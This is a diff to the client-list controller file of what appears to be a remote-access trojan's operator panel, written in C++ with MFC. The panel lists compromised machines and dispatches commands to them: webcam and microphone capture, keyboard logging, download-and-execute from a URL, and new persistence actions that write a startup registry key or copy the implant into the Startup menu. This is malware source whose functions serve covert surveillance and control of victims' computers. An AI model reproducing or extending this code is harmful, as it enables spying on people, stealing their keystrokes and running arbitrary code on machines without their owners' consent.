@@ -1,7 +1,7 @@
 #include "stdafx.h"
 #include "ClientList.h"
 #include "KernelSrv.h"
-#include "EventHandler.h"
+#include "MsgHandler.h"
 #include "Resource.h"
 #include "EditCommentDlg.h"
 #include "UrlInputDlg.h"
@@ -32,8 +32,12 @@ BEGIN_MESSAGE_MAP(CClientList, CListCtrl)
 	ON_COMMAND(ID_OPERATION_CAMERA, &CClientList::OnOperationCamera)
 	ON_COMMAND(ID_SESSION_RESTART, &CClientList::OnSessionRestart)
 	ON_COMMAND(ID_OPERATION_MICROPHONE, &CClientList::OnOperationMicrophone)
-	ON_COMMAND(ID_OPERATION_DOWNLOADANDEXEC, &CClientList::OnOperationDownloadandexec)
 	ON_COMMAND(ID_OPERATION_KEYBOARD, &CClientList::OnOperationKeyboard)
+	ON_COMMAND(ID_UTILS_ADDTO, &CClientList::OnUtilsAddto)
+	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CClientList::OnUtilsCopytostartup)
+	ON_MESSAGE(WM_KERNEL_ERROR, OnKernelError)
+	ON_MESSAGE(WM_KERNEL_UPDATE_UPLODA_STATU, OnUpdateUploadStatu)
+	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CClientList::OnUtilsDownloadandexec)
 END_MESSAGE_MAP()
 
 
@@ -53,32 +57,33 @@ int CClientList::OnCreate(LPCREATESTRUCT lpCreateStruct)
 	dwExStyle |= LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT | LVS_EX_AUTOCHECKSELECT | LVS_EX_CHECKBOXES;
 	SetExtendedStyle(dwExStyle);
 	//左对齐
-	InsertColumn(0, L"IP", LVCFMT_LEFT, 140);
+	InsertColumn(0, L"IP", LVCFMT_LEFT, 160);
 	InsertColumn(1, L"Private IP", LVCFMT_LEFT, 120);		//OK
 	InsertColumn(2, L"Host", LVCFMT_LEFT, 100);				//OK
 	InsertColumn(3, L"User", LVCFMT_LEFT, 100);				//OK
 	InsertColumn(4, L"OS", LVCFMT_LEFT, 110);				//OK
 	InsertColumn(5, L"InstallDate", LVCFMT_LEFT, 110);		//--
-	InsertColumn(6, L"CPU", LVCFMT_LEFT, 110);				//OK
+	InsertColumn(6, L"CPU", LVCFMT_LEFT, 120);				//OK
 	InsertColumn(7, L"Disk/RAM", LVCFMT_LEFT, 120);			//OK
 	InsertColumn(8, L"HasCamera", LVCFMT_LEFT, 100);		//OK
 	InsertColumn(9, L"Ping", LVCFMT_LEFT, 70);				//OK
 	InsertColumn(10, L"Comment", LVCFMT_LEFT, 150);			//---
+	InsertColumn(11, L"", LVCFMT_LEFT, 300);			//---
 	return 0;
 }
 
 LRESULT CClientList::OnClientLogin(WPARAM wParam, LPARAM lParam)
 {
-	CEventHandler*pHandler = (CEventHandler*)wParam;
+	CKernelSrv*pHandler = (CKernelSrv*)wParam;
 	CKernelSrv::LoginInfo*pLoginInfo = (CKernelSrv::LoginInfo*)lParam;
 	CString Text;
 	int idx = GetItemCount();
-	char PeerName[64];
-	USHORT Port;
-	pHandler->GetPeerName(PeerName, Port);
+
+	CString sItem;
+	sItem.Format(TEXT("%s"), pHandler->GetLocation().GetBuffer());
 	//显示目标主机信息
 	//IP
-	InsertItem(idx, CA2W(PeerName));
+	InsertItem(idx, sItem);
 	//Private IP
 	SetItemText(idx, 1, pLoginInfo->szPrivateIP);
 	//Host
@@ -104,8 +109,8 @@ LRESULT CClientList::OnClientLogin(WPARAM wParam, LPARAM lParam)
 	SetItemText(idx, 9, Text);
 	//Comment
 	SetItemText(idx, 10, pLoginInfo->szComment);
-	//Comment
-	SetItemText(idx, 11, L"N");
+	//
+	SetItemText(idx, 11, TEXT(""));
 	//保存Handler
 	SetItemData(idx, (DWORD_PTR)pHandler);
 	return 0;
@@ -113,28 +118,64 @@ LRESULT CClientList::OnClientLogin(WPARAM wParam, LPARAM lParam)
 
 LRESULT CClientList::OnClientLogout(WPARAM wParam, LPARAM lParam)
 {
-	//CEventHandler*pHandler = (CEventHandler*)wParam;
-	for (int i = 0; i < GetItemCount(); i++)
-	{
-		if (GetItemData(i) == wParam)
-		{
-			DeleteItem(i);
-			break;
-		}
+	//CMsgHandler*pHandler = (CMsgHandler*)wParam;
+	LVFINDINFO fi = { 0 };
+	fi.flags = LVFI_PARAM;
+	fi.lParam = wParam;
+	int index = FindItem(&fi);
+
+	if (index >= 0){
+		DeleteItem(index);
+	}
+	return 0;
+}
+
+#include "utils.h"
+LRESULT CClientList::OnUpdateUploadStatu(WPARAM wParam, LPARAM lParam){
+	LPVOID * ArgList = (LPVOID*)lParam;
+	TCHAR szModuleSize[64], szFinishedSize[64];
+	CMsgHandler* pHandler = (CMsgHandler*)ArgList[0];
+	CString ModuleName = CA2W((char*)ArgList[1]).m_psz;
+	LARGE_INTEGER  ModuleSize = { 0 }, FinishedSize = { 0 };
+	//
+	ModuleSize.LowPart= (DWORD)ArgList[2];
+	FinishedSize.LowPart = (DWORD)ArgList[3];
+
+	GetStorageSizeString(ModuleSize, szModuleSize);
+	GetStorageSizeString(FinishedSize, szFinishedSize);
+	//
+	LVFINDINFO fi = { 0 };
+	fi.flags = LVFI_PARAM;
+	fi.lParam = (LPARAM)pHandler;
+	int index = FindItem(&fi);
+
+	if (index >= 0){
+		CString Statu;
+		Statu.Format(TEXT("%s : %s/%s (%.2lf%%)"), ModuleName.GetBuffer(),
+			szFinishedSize, szModuleSize, 100.00 * FinishedSize.LowPart / ModuleSize.LowPart);
+
+		SetItemText(index, 11, Statu);
 	}
 	return 0;
 }
 
 LRESULT CClientList::OnEditComment(WPARAM wParam, LPARAM lParam)
 {
-	for (int i = 0; i < GetItemCount(); i++)
-	{
-		if (GetItemData(i) == wParam)
-		{
-			SetItemText(i, 10, (WCHAR*)lParam);
-			break;
-		}
+	LVFINDINFO fi = { 0 };
+	fi.flags = LVFI_PARAM;
+	fi.lParam = wParam;
+	int index = FindItem(&fi);
+
+	if (index >= 0){
+		SetItemText(index, 10, (TCHAR*)lParam);
 	}
+	return 0;
+}
+
+LRESULT CClientList::OnKernelError(WPARAM error, LPARAM lParam){
+
+	CString IP = CA2W((char*)lParam);
+	MessageBox((TCHAR*)error, IP,MB_ICONWARNING|MB_OK);
 	return 0;
 }
 
@@ -182,8 +223,7 @@ void CClientList::OnSessionDisconnect()
 {
 	// TODO:  在此添加命令处理程序代码
 	POSITION pos = GetFirstSelectedItemPosition();
-	while (pos)
-	{
+	while (pos){
 		int CurSelIdx = GetNextSelectedItem(pos);
 		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
 		pHandler->BeginExit();
@@ -202,6 +242,7 @@ void CClientList::OnOperationEditcomment()
 	if (dlg.DoModal() != IDOK)
 		return;
 
+	pos = GetFirstSelectedItemPosition();
 	while (pos)
 	{
 		int CurSelIdx = GetNextSelectedItem(pos);
@@ -297,22 +338,7 @@ void CClientList::OnOperationMicrophone()
 }
 
 
-void CClientList::OnOperationDownloadandexec()
-{
-	// TODO:  在此添加命令处理程序代码
-	POSITION pos = GetFirstSelectedItemPosition();
-	if (!pos)
-		return;
-	CUrlInputDlg dlg;
-	if (IDOK != dlg.DoModal() || dlg.m_Url.GetLength() == NULL)
-		return;
-	while (pos)
-	{
-		int CurSelIdx = GetNextSelectedItem(pos);
-		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
-		pHandler->BeginDownloadAndExec(dlg.m_Url.GetBuffer());
-	}
-}
+
 
 
 void CClientList::OnOperationKeyboard()
@@ -323,5 +349,49 @@ void CClientList::OnOperationKeyboard()
 		int CurSelIdx = GetNextSelectedItem(pos);
 		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
 		pHandler->BeginKeyboardLog();
+	}
+}
+
+
+void CClientList::OnUtilsAddto()
+{
+	POSITION pos = GetFirstSelectedItemPosition();
+	while (pos)
+	{
+		int CurSelIdx = GetNextSelectedItem(pos);
+		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
+		pHandler->UtilsWriteStartupReg();
+	}
+
+}
+
+
+void CClientList::OnUtilsCopytostartup()
+{
+	POSITION pos = GetFirstSelectedItemPosition();
+	while (pos)
+	{
+		int CurSelIdx = GetNextSelectedItem(pos);
+		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
+		pHandler->UtilsCopyToStartupMenu();
+	}
+}
+
+
+void CClientList::OnUtilsDownloadandexec()
+{
+	// TODO:  在此添加命令处理程序代码
+	POSITION pos = GetFirstSelectedItemPosition();
+	if (!pos)
+		return;
+	CUrlInputDlg dlg;
+	if (IDOK != dlg.DoModal() || dlg.m_Url.GetLength() == NULL)
+		return;
+	//可能在DoModal返回之后ClientList里面的东西变了...
+	pos = GetFirstSelectedItemPosition();
+	while (pos){
+		int CurSelIdx = GetNextSelectedItem(pos);
+		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
+		pHandler->BeginDownloadAndExec(dlg.m_Url.GetBuffer());
 	}
 }
